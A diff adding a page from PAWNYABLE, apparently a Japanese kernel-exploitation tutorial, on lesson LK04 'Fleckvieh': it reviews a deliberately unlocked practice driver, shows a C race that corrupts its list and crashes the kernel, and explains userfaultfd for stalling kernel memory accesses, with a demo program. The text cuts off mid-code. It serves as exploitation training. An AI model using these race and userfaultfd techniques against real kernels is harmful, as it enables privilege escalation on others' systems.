@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>userfaultfdの利用 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                userfaultfdの利用
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"></div>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>LK04(Fleckvieh)では、LK01-4(Holstein v4)で学んだものと同様のRace Conditionを、より厳しい条件で扱います。まず<a href="distfiles/LK04.tar.gz">練習問題LK04</a>のファイルをダウンロードしてください。</p>
+<div class="column" title="目次">
+<!-- toc -->
+<ul>
+<li><a href="#%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E7%A2%BA%E8%AA%8D">ドライバの確認</a></li>
+<li><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E7%A2%BA%E8%AA%8D">脆弱性の確認</a></li>
+<li><a href="#userfaultfd%E3%81%A8%E3%81%AF">userfaultfdとは</a></li>
+<li><a href="#userfaultfd%E3%81%AE%E4%BD%BF%E7%94%A8%E4%BE%8B">userfaultfdの使用例</a></li>
+<li><a href="#race%E3%81%AE%E5%AE%89%E5%AE%9A%E5%8C%96">Raceの安定化</a></li>
+</ul>
+<!-- tocstop -->
+<br>
+</div>
+<h2><span id="ドライバの確認">ドライバの確認</span></h2>
+<p>まずはドライバのソースコードを読んでみてください。今回のドライバは今までに比べると量が多く、これまで登場しなかった機能や記法が存在します。<code>module_open</code>は次のようになっています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">module_open</span><span class="params">(struct inode *inode, struct file *filp)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Allocate list head */</span></span><br><span class="line">  filp-&gt;private_data = (<span class="keyword">void</span>*)kmalloc(<span class="keyword">sizeof</span>(struct list_head), GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (unlikely(!filp-&gt;private_data))</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  INIT_LIST_HEAD((struct list_head*)filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>まず4行目に<code>unlikely</code>というマクロが登場しています。これはLinuxカーネルでは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/compiler.h#L77">次のように定義され</a>、頻繁に登場します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> likely(x)      __builtin_expect(!!(x), 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0)</span></span><br></pre></td></tr></table></figure>
+<p>ほとんどの場合片方しか通らない条件分岐（セキュリティチェックやメモリ不足の確認）などにおいて、どちらの分岐に通りやすいかをコンパイラに教えられます。正しい予測で<code>likely</code>, <code>unlikely</code>マクロを使えば、何度も通るような条件分岐では実行速度の向上に繋がります。</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasua.png" alt="オオカミくん"></div>
+  <p class="says">
+    コンパイラにヒントを与えると、よく通るパスほど命令数や分岐回数を減らしてくれるよ。
+    このあたりの話はCPUの分岐予測とも関わるから、気になる人は調べてみてね。
+  </p>
+</div>
+<p>次に、7行目に<code>INIT_LIST_HEAD</code>というマクロが登場しています。これは<code>tty_struct</code>などで登場した双方向リストの<code>list_head</code>構造体を初期化するためのマクロです。各ファイルopenに対して双方向リストを作るために<code>private_data</code>にこの構造体を入れています。<br>
+このリストは<code>blob_list</code>構造体に繋がります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="keyword">char</span> *data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125; blob_list;</span><br></pre></td></tr></table></figure>
+<p>リストへのアイテムの追加は<code>list_all</code>, 削除は<code>list_del</code>, イテレーションは<code>list_for_each_entry(_safe)</code>などの操作があります。具体的な使い方については適宜調べてください。</p>
+<p><code>ioctl</code>の実装を見ると、このモジュールには<code>CMD_ADD</code>, <code>CMD_DEL</code>, <code>CMD_GET</code>, <code>CMD_SET</code>の4種類の操作があることが分かります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">module_ioctl</span><span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">top</span>;</span></span><br><span class="line">  <span class="keyword">request_t</span> req;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(copy_from_user(&amp;req, (<span class="keyword">void</span>*)arg, <span class="keyword">sizeof</span>(req))))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  top = (struct list_head*)filp-&gt;private_data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_ADD: <span class="keyword">return</span> blob_add(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_DEL: <span class="keyword">return</span> blob_del(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_GET: <span class="keyword">return</span> blob_get(top, &amp;req);</span><br><span class="line">    <span class="keyword">case</span> CMD_SET: <span class="keyword">return</span> blob_set(top, &amp;req);</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>CMD_ADD</code>はリストに<code>blob_list</code>を追加します。各<code>blob_list</code>は0x1000バイト以下のデータを持ち、内容は任意に設定できます。また、追加時にランダムにIDが割り振られ、<code>ioctl</code>の返り値としてユーザー側が貰えます。ユーザーは以降そのIDを使って、その<code>blob_list</code>を操作できます。<br>
+<code>CMD_DEL</code>は、IDを渡すことで対応する<code>blob_list</code>をリストから破棄できます。<br>
+<code>CMD_GET</code>は、IDとバッファおよびサイズを指定して、対応する<code>blob_list</code>のデータをユーザー空間にコピーします。<br>
+最後に<code>CMD_SET</code>は、IDとバッファおよびサイズを指定して、対応する<code>blob_list</code>にユーザー空間からデータをコピーします。</p>
+<p>今までのモジュールと同様にデータを保存できる機能ですが、Fleckviehではリストでデータを管理しており、複数のデータを保存できるようになっています。</p>
+<h2><span id="脆弱性の確認">脆弱性の確認</span></h2>
+<p>LK01をすべて勉強した方なら脆弱性は一目瞭然でしょう。どこの処理にもロックが取られていないため、簡単にデータ競合が発生します。しかし、この競合をexploitしようとすると問題が発生します。<br>
+データを双方向リストという複雑な構造で管理しているため、削除するタイミングでデータを読み書きしようとしても、unlinkのタイミングで書き込もうとする可能性があり、リンクやカーネルヒープの状態が破壊されてしまいます。すると、race中にクラッシュしたり、Use-after-Freeができたかを判定できなかったりと困ります。<br>
+実際にraceを書いて確認しましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ADD, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .id = id &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_DEL, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .id = id, .size = size, .data = data &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SET, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> race_win;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">while</span> (!race_win) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  race_win = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pthread_t</span> th;</span><br><span class="line">  pthread_create(&amp;th, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">    id = add(<span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    del(id);</span><br><span class="line">  &#125;</span><br><span class="line">  race_win = <span class="number">1</span>;</span><br><span class="line">  pthread_join(th, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>このコードでは複数スレッドでデータの追加と削除を繰り返します。競合が発生すると双方向リストのリンクが壊れるため、最後の<code>close</code>でリストの内容を解放する際にクラッシュします。</p>
+<p>このように、複雑なデータ構造における競合はexploitできないのでしょうか。</p>
+<h2><span id="userfaultfdとは">userfaultfdとは</span></h2>
+<p>今回のように複雑な条件の競合をexploitしたり、競合の成功確率を100%にするために、userfaultfdという機能を悪用した攻撃方法があります。</p>
+<p><code>CONFIG_USERFAULTFD</code>を付けてLinuxをビルドすると、<strong>userfaultfd</strong>という機能が使えるようになります。userfaultfdはユーザー空間でページフォルトをハンドルするための機能で、システムコールとして実装されています。</p>
+<p><code>CAP_SYS_PTRACE</code>を持っていないユーザーが<code>userfaultfd</code>をすべての権限で使うためには<code>unprivileged_userfaultfd</code>フラグが1になっている必要があります。このフラグは<code>/proc/sys/vm/unprivileged_userfaultfd</code>で設定・確認でき、デフォルトでは0になっていますが、LK04のマシンでは1になっていることが確認できます。</p>
+<p>ユーザーは<code>userfaultfd</code>システムコールでファイルディスクリプタを受け取り、それにハンドラやアドレスなどの設定を<code>ioctl</code>で適用します。userfaultfdを設定したページでページフォルトが起きた場合（初回アクセス時）、設定したハンドラが呼び出され、ユーザー側でどのようなデータ（マップ）を返すかを指定できます。図で表すと次のような手順で処理が発生します。</p>
+<center>
+  <img src="img/uffd.png" alt="userfaultfdの処理手順" style="width:720px;">
+</center>
+<p>ページフォルトが発生すると登録したユーザー空間のハンドラが呼び出されるため、ページを読もうとしたスレッド1は、スレッド2のハンドラがデータを返すまでブロックします。これはカーネル空間からのページ読み書きでも同じなため、読み書きのタイミングでカーネル空間の処理を停止させられます。</p>
+<h2><span id="userfaultfdの使用例">userfaultfdの使用例</span></h2>
+<p>試しに次のコードを実行してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fatal</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *dummy_page;</span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">long</span> uffd;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  dummy_page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (dummy_page == MAP_FAILED) fatal(<span class="string">&quot;mmap(dummy)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ページフォルト待機 */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: flag=0x%llx\n&quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] uffd: addr=0x%llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 要求されたページとして返すデータを設定 */</span></span><br><span class="line">    <span class="keyword">if</span> (fault_cnt++ == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">strcpy</span>(dummy_page, <span class="string">&quot;Hello, World! (2)&quot;</span>);</span><br><span class="line">    copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)dummy_page;</span><br><span class="line">    copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_uffd</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">  <span class="keyword">long</span> uffd;</span><br><span class="line">  <span class="keyword">pthread_t</span> th;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* userfaultfdの作成 */</span></span><br><span class="line">  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  <span class="keyword">if</span> (uffd == <span class="number">-1</span>) fatal(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffdio_api.api = UFFD_API;</span><br><span class="line">  uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;ioctl(UFFDIO_API)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ページをuserfaultfdに登録 */</span></span><br><span class="line">  uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr;</span><br><span class="line">  uffdio_register.range.len = len;</span><br><span class="line">  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ページフォルトを処理するスレッドを作成 */</span></span><br><span class="line">  <span class="keyword">if</span> (pthread_create(&amp;th, <span class="literal">NULL</span>, fault_handler_thread, (<span class="keyword">void</span>*)uffd))</span><br><span class="line">    fatal(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* スレッド中のputsとfutexでハングするので直接printfで出力しない */</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="keyword">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="keyword">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="keyword">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="keyword">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span 